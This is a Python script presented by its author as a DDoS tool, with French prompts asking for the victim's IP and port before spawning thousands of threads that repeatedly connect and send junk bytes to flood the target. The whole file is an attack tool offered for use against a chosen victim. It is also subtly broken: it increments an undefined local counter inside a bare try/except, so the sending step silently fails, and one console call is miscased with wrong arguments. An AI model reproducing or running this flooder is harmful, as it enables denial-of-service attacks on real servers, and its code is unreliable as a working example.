import socket
from threading import Thread
from pystyle import *
import time

def check_port(ip: str, port: int) -> bool:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)

        addr = (ip, port)
        check = sock.connect_ex(addr)
        sock.close()

        return not check
    except:
        return False

def attack(ip: str, port: int, th: int):
    n = 1
    for i in range(th):
        Thread(target=_attack, args=[ip, port]).start()
        print(Colorate.Horizontal(Colors.red, f"Creating thread's {i + 1}..."))


def _attack(ip: str, port: int):
    while True:
        print(Colorate.Horizontal(Colors.blue_to_red, f"Connecting to the server..."))
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            addr = (ip, port)
            sock.connect_ex(addr)
            
            n += 1
            print(Colorate.Horizontal(Colors.blue_to_red, f"Sending bytes to {ip}:{port}..."))
            sock.send(b'DDOS tool IcI -> https://github.com/NeXoS-20/Ddos/ \n'*1024)
        except:
            print(Colorate.Horizontal(Colors.red_to_blue, "/!\ Reconnexion en cours ... /!\ "))

if __name__ == '__main__':
    System.Title("DDOS Tool By NeXoS_20#4225")
    System.Size(60, 30)

    credit = Write.Input("Made By NeXoS_20#4225", Colors.yellow_to_green, interval=0.015)

    ip = Write.Input("IP De La Victime\n\n\n\n>", Colors.yellow_to_green, interval=0.015)

    port = Write.Input("Port \nExemplee:\nHTTP:8080\nHTTPS:443\n\n\n\n>", Colors.yellow_to_green, interval=0.015)
    
    try:
        port = int(port)
    except ValueError:
        Colorate.Error(port, " Port  Invalide", wait=True)

    threads = Write.Input("Nombre de bot (Rien = 10000 bots) -> ", Colors.yellow_to_green, interval=0.005)
    if not threads: threads = '10000'

    try:
        threads = int(threads)
    except ValueError:
        Colorate.Error("\nNumber on threads is not valid, restart the program...", wait=True)


    print('\n')

    if check_port(ip, port):
        print("Connexion:",ip,":",port)
        time.sleep(5)
    else:
        Write.input("The system is not available to start an attack to > ",ip,":",port, "\n Retry and check the informations..", Colors.purple_to_red, interval=0.015)
        exit()

    attack(ip, port, threads)
